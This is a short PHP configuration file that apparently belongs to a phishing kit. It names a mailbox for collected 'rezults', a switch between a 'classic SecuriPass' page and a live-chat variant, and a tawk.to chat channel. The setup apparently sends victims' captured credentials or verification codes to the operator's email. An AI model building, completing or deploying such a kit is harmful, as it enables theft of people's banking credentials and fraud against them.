<?php

$Mail="asapoff007@yandex.com";  // Mail for rezults

$option=0;  // set 0 for classic SecuriPass , 1 for chat option

$channel ="https://tawk.to/chat/5e3d90c7a89cda5a1884bda4/default" ; // Chat channel Ex: https://tawk.to/chat/{Channel}


?>